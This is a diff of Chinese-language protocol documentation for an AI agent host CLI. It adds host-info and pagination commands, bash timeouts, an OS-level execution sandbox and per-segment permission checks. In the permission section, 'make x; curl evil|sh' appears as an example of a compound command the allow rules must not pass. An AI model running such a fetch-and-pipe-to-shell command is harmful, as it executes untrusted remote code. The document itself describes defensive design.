@@ -20,6 +20,7 @@ spawn("pai-cli", [], {
 - 协议走 **stdin/stdout JSONL**，stderr 是日志（无协议含义；worker 的日志带 `[pai:worker:<threadId>]` 前缀转发到 host stderr）。
 - 进程生命周期：stdin EOF / SIGTERM / SIGINT → host 优雅停掉全部 worker（落盘会话）并 exit 0。
 - 心跳：stdout 每 1 秒一帧 `{"type":"heartbeat"}`；**超过 10 秒没有心跳 = 进程卡死**，杀掉重启后用 `thread/resume` 恢复各会话（`thread/list` 的 `sessionPath` 先持久化到你的注册表）。
+- 环境旋钮（v0.6 汇总；当前生效值可用 `get_host_info.limits` 回读）：`PAI_MAX_THREADS`（32）、`PAI_IDLE_RETIRE_MS`（900000）、`PAI_WORKER_STALE_MS`（30000）、`PAI_WORKER_EXIT_TIMEOUT_MS`（10000）、`PAI_MAX_SUBAGGENTS`（16，全局**正在运行**孙进程上限，超出时该任务立即失败、模型可重试）、`PAI_BASH_TIMEOUT_MS`（600000，直执行 bash 服务端墙钟；`0` 关闭）、`PAI_SANDBOX`（v0.7，`off|0|false` 强制关闭执行沙箱）。
 
 ## 2. 协议基础
 
@@ -28,21 +29,22 @@ spawn("pai-cli", [], {
 - 行上限 16 MiB：超限整行丢弃并回 parse failure。
 - 错误统一形态：`{"type":"response","success":false,"error":"英文描述"}`，进程不会因单条命令失败而退出。
 
-## 3. 命令总览（36 个）
+## 3. 命令总览（38 个）
 
-| 组            | 命令                                                                                                                 |
-| ------------- | -------------------------------------------------------------------------------------------------------------------- |
-| 线程生命周期  | thread/start、thread/resume、thread/stop、thread/list、thread/list_saved                                             |
-| 对话驱动      | prompt、steer、follow_up、abort、clear_queue、compact                                                                |
-| 状态与历史    | get_state、get_messages、get_entries、get_tree、get_session_stats、set_session_name、get_commands、get_fork_messages |
-| 会话树/分叉   | fork、clone、navigate_tree                                                                                           |
-| 模型          | get_models、set_model、set_thinking_level、get_thinking_levels                                                       |
-| 凭据          | auth/list、auth/set_api_key、auth/remove_key                                                                         |
-| 直执行        | bash、abort_bash                                                                                                     |
-| 对话框        | ui_response                                                                                                          |
-| 子 agent 通信 | subagent/steer                                                                                                       |
-| 权限（v0.5）  | get_permission_rules、set_permission_rules                                                                           |
-| agent（v0.5） | agents/list                                                                                                          |
+| 组               | 命令                                                                                                                 |
+| ---------------- | -------------------------------------------------------------------------------------------------------------------- |
+| 线程生命周期     | thread/start、thread/resume、thread/stop、thread/list、thread/list_saved                                             |
+| 对话驱动         | prompt、steer、follow_up、abort、clear_queue、compact                                                                |
+| 状态与历史       | get_state、get_messages、get_entries、get_tree、get_session_stats、set_session_name、get_commands、get_fork_messages |
+| 会话树/分叉      | fork、clone、navigate_tree                                                                                           |
+| 模型             | get_models、set_model、set_thinking_level、get_thinking_levels                                                       |
+| 凭据             | auth/list、auth/set_api_key、auth/remove_key                                                                         |
+| 直执行           | bash、abort_bash                                                                                                     |
+| 对话框           | ui_response                                                                                                          |
+| 子 agent 通信    | subagent/steer                                                                                                       |
+| 权限（v0.5）     | get_permission_rules、set_permission_rules                                                                           |
+| agent（v0.5）    | agents/list                                                                                                          |
+| 宿主信息（v0.6） | get_host_info                                                                                                        |
 
 ## 4. 命令明细
 
@@ -54,7 +56,8 @@ spawn("pai-cli", [], {
 
 **`thread/resume`** — 恢复历史会话（窗口重开 / hub 重启恢复用）。
 字段：`sessionPath`（必填，**必须是绝对路径**——回传 `thread/start`/`thread/resume` 响应里的原值即可；相对路径、文件不存在、或文件不在 `<agentDir>/sessions/` 目录之下——含符号链接指向圈外——都会回 `failure`，**不会**静默开出一个空会话，也不可借此加载磁盘上任意会话格式文件）、`cwd?`（缺省取**会话文件头记录的 cwd**）、`trusted?`。
-响应同 start。同一文件在本 hub 内已打开 → `success:false`（先 `thread/stop` 旧线程再 resume）。恢复后历史用 `get_entries`/`get_messages` 拉取渲染。
+响应同 start。同一文件在本 hub 内已打开 → `success:false`（先 `thread/stop` 旧线程再 resume）。恢复后历史用 `get_entries`（首屏 `limit` 取尾部 + `before` 向前翻页；避免 `get_messages` 全量单帧）拉取渲染。
+撕裂写容忍（实测钉死，e2e-mock `torn-session-file` 场景回归）：末行截断（断电类）与中部坏行都能恢复——坏行被丢弃、**完好前缀逐条保留**；仅会话头的文件恢复为空对话；零字节文件恢复成功但 pi 会合成新 sessionId（已知 v1 边界：从未持久化的会话本就无历史可丢）。
 
 **`thread/stop`** — 释放对话（dispose，会话文件保留）。幂等：未知 id 也回 success。配合 resume 实现"闲置回收"。
 
@@ -72,15 +75,21 @@ spawn("pai-cli", [], {
 **`abort`** — 停止当前轮（也会 settle 该线程挂起的确认框）。
 **`clear_queue`** — 清空排队消息并返回文本：`{steering:[], followUp:[]}`。Esc 键语义 = `clear_queue` + `abort`。
 
-**`compact`** — 压缩上下文（LLM 总结历史）。字段：`customInstructions?`。响应含 summary/tokens；上下文太小会被 pi 拒（"too small"，属正常响应）。
+**`compact`** — 压缩上下文（LLM 总结历史）。字段：`customInstructions?`。响应含 summary/tokens；上下文太小会被 pi 拒（"too small"，属正常响应）。**长操作：响应在压缩完成时才返回**（可能远超普通命令的秒级），客户端应设长超时或无超时；中断用 `abort`。
 
 ### 状态与历史
 
 **`get_state`** — 单次往返拿到面板所需的全部状态：`{model, thinkingLevel, isStreaming, isCompacting, sessionId, sessionName, sessionFile, messageCount}`。
 
-**`get_messages`** — 当前分支全量消息（`AgentMessage[]`：user/assistant/toolResult/bashExecution）。**长会话建议用 get_entries**。
+**`get_messages`** — 当前分支全量消息（`AgentMessage[]`：user/assistant/toolResult/bashExecution），**无分页、单帧可随会话无限增长**（数十 MB 级会话产生等量单行帧）。仅适合小会话/诊断；UI 水化与长会话一律用 `get_entries` 的 `limit` 分页。
 
-**`get_entries`** — 会话条目（追加序树），`since?` 为增量游标：传"已见的最后一条 entry id"，只返回其后条目——**跨进程重启也有效**（entry id 持久）。注意：切片按追加序，`navigate_tree` 切分支后增量里可能含已放弃分支的条目，重建活动分支对话要配合 `get_tree`/`leafId`。
+**`get_entries`** — 会话条目（追加序树）。游标与分页：
+
+- `since?`（前向游标，增量）：传"已见的最后一条 entry id"，只返回其后条目——**跨进程重启也有效**（entry id 持久）。
+- `before?`（后向游标，翻页）：只返回该 entry id **之前**（更旧）的条目，配合 `limit` 向前翻页。
+- `limit?`（正整数，≤5000）：窗口内只返回**最近的 N 条**；响应的 `hasMore`（恒返回）在窗口内还有更旧条目被截去时为 true。不传 = 全量（旧语义，长会话慎用）。
+- 响应：`{entries, leafId, hasMore}`。首屏水化推荐 `get_entries {threadId, limit: N}` 取尾部，`hasMore` 为 true 时用 `before: 返回的最旧 entry id` 继续向前翻。
+- 注意：切片按追加序，`navigate_tree` 切分支后增量里可能含已放弃分支的条目，重建活动分支对话要配合 `get_tree`/`leafId`。
 
 **`get_tree`** — 会话树 `{tree, leafId}`（分支导航 UI 用）。
 
@@ -114,7 +123,8 @@ fork/clone 失败语义：校验类失败（如 entry 不存在、会话未落�
 
 ### 直执行 bash（用户在输入框跑命令）
 
-**`bash`** — 字段：`threadId`、`command`、`excludeFromContext?`（不喂给模型）。**先过权限门**（与 agent 工具调用同一套规则+弹窗，§6），通过后执行。流式输出经事件帧 `bash_execution_update`（带命令 `id`）实时到达；最终 `BashResult` 在 response（output/exitCode/cancelled/truncated/fullOutputPath?）。输出会记入会话、在下一次 prompt 时进入模型上下文。
+**`bash`** — 字段：`threadId`、`command`、`excludeFromContext?`（不喂给模型）、`timeoutMs?`（v0.6，见下）。**先过权限门**（与 agent 工具调用同一套规则+弹窗，§6），通过后执行。流式输出经事件帧 `bash_execution_update`（带命令 `id`）实时到达；最终 `BashResult` 在 response（output/exitCode/cancelled/truncated/fullOutputPath?）。**与 prompt 不同，bash 是长操作：response 在命令执行完成时才返回**（构建/安装类命令可达分钟级），客户端应设长超时或无超时，取消用 `abort_bash`。输出会记入会话、在下一次 prompt 时进入模型上下文。
+`timeoutMs`（服务端墙钟，v0.6）：正整数 ≤ 86_400_000；`0` = 显式关闭本命令超时；缺省取环境旋钮 `PAI_BASH_TIMEOUT_MS`（默认 600_000 = 10 分钟，同样支持 `0` 关闭）。到点服务端触发中止：response 为 `success:true` + `BashResult.cancelled:true`（与 abort_bash 同形，不是 failure）；非法值（负数/非整数/超上限）→ failure。注意：到点触发的是 pi 的会话级 `abortBash`，它会中止**该会话全部运行中的 bash**——包括并发发出的其他直执行命令（哪怕那条带 `timeoutMs:0`）；并发直执行需要互相隔离时请用独立线程。扩展经 `user_bash` 替换执行的路径不受服务端计时（扩展自身责任，与 pi RPC 模式一致）。
 **`abort_bash`** — 中止运行中的直执行命令。
 
 ### 对话框应答
@@ -130,6 +140,27 @@ fork/clone 失败语义：校验类失败（如 entry 不存在、会话未落�
 ### agent 定义枚举（v0.5）
 
 **`agents/list`** — 字段 `threadId?`。host 本地命令：返回 `[{name, description, source:"user"|"project", tools?, model?}]`。带 threadId 时按该线程的信任级与 cwd 决定是否含项目级 `.pi/agents`（仅 `trusted:true` 线程可见，同名项目级覆盖 user 级）；不带则仅 user 级。设置界面用它枚举可管理的 agent；模型侧的 task 工具按同一作用域热发现。
+
+### 宿主信息（v0.6，host 本地）
+
+**`get_host_info`** — 无字段，host 本地应答（不唤醒任何 worker）。生产排障的单点入口：`{version, piVersion, bunVersion, pid, uptimeMs, rssBytes, threads:{live,parked,dead}, subagents:{running}, limits:{maxThreads, idleRetireMs, workerStaleMs, workerExitTimeoutMs, maxSubagents, bashTimeoutMs}}`。版本为 host 启动期一次性读取（pai-cli / pi SDK / bun）；`subagents.running` 是全局**正在运行**的孙进程数（grant 账本口径，非心跳的在飞口径）；`limits` 回显当前生效的全部环境旋钮值。不含任何路径、env 或凭据信息。
+
+### 沙箱（v0.7，agent 执行沙箱）
+
+**配置**（文件即真相，**会话创建时快照**——改动需 thread/stop+resume 或 host 重启，与权限规则的热读不同）：
+
+- 全局 `<agentDir>/sandbox.json`；项目级 `<cwd>/.pi/sandbox.json` **仅 `trusted:true` 线程合并**（防恶意仓库自我松绑）；坏文件降级默认永不抛错；分节合并、数组整体替换。
+- **默认 `enabled:true`**（用户裁决：默认开启可关）。默认策略：网络白名单 = 回环 + npm/pypi/github 系域名；`denyRead: ["~/.ssh","~/.aws","~/.gnupg"]`；`allowWrite: [".","/tmp"]`（"." = 会话 cwd）；`denyWrite: [".env",".env.*","*.pem","*.key"]`。两份 sandbox.json 自身恒为 write 工具的 denyWrite（防篡改未来会话快照）。
+- 机器级逃生舱：`PAI_SANDBOX=off|0|false` 强制全局关闭。
+
+**语义**（两层强制，一道防线在权限门之后）：
+
+- **bash（agent 工具 + 直执行）**：OS 级包裹（macOS sandbox-exec / Linux bubblewrap，需 bwrap）。被拒表现为命令自身的非零退出与 stderr（模型可见自适应）。平台不支持或初始化失败 → bash 不包裹（fail-open）+ `degraded` 可见 + stderr 警告一次；write/edit/read 检查不受影响。
+- **write/edit**：`allowWrite` 目录包含之外的路径、或命中 `denyWrite` → 直接 block（不弹窗）。路径按 pi 工具语义解析（`~`/`file://`/`@`/unicode 空格归一）+ realpath 效应空间；比较 NFC 归一、大小写折叠（darwin/win32）。
+- **read**：`denyRead` 命中 → block。
+- 权限门先裁决（弹窗展示原始命令），沙箱后强制；权限门 block 的调用到不了沙箱。
+
+**`get_sandbox_state`** — 字段 `threadId`。→ `{enabled, platform, degraded?, network, filesystem, source:"global"|"global+project", bashSandboxed:boolean}`（bashSandboxed = OS 层实际生效；enabled:true 但 bashSandboxed:false 即降级态）。
 
 ### 子 agent 通信（v0.5 stage 7）
 
@@ -185,7 +216,7 @@ hub 发 `{"type":"ui_request","requestId":..,"threadId":..,"method":..,...}`：
 }
 ```
 
-判定顺序：`allow-all` 全放行（含 block）→ `block-all` 全拦 → 命中 blockPatterns 拦 → 命中 allowPatterns 放 → 其余 `ask` 弹 confirm。`*` 跨任意字符（含 `/`）；bash 匹配命令串，write/edit 匹配原始 path 入参。坏文件/坏形状自动降级 `{mode:"ask"}`，永不抛错。
+判定顺序：`allow-all` 全放行（含 block）→ `block-all` 全拦 → 命中 blockPatterns 拦 → 命中 allowPatterns 放——**bash 组合命令逐段校验**：`;` `&&` `&` `||` `|` 换行分段的每一段都须各自命中某条 allow 模式，且反引号/`$(`/`<`/`>`（替换与重定向）出现即降级 `ask`（`"make *"` 不放行 `make x; curl evil|sh`；`"echo *"`+`"sleep *"` 放行 `echo a && sleep 1 && echo b`）→ 其余 `ask` 弹 confirm。`*` 跨任意字符（含 `/`），分段线性匹配；bash 匹配命令串，write/edit 匹配**解析后的绝对路径**（词法 resolve 到会话 cwd + realpath 收缩已存在目录组件；`..` 与符号链接目录不能逃出 allow 前缀）。坏文件/坏形状自动降级 `{mode:"ask"}`，永不抛错。
 
 ## 7.5 子 agent 与后台任务可观察面（v0.5）
 
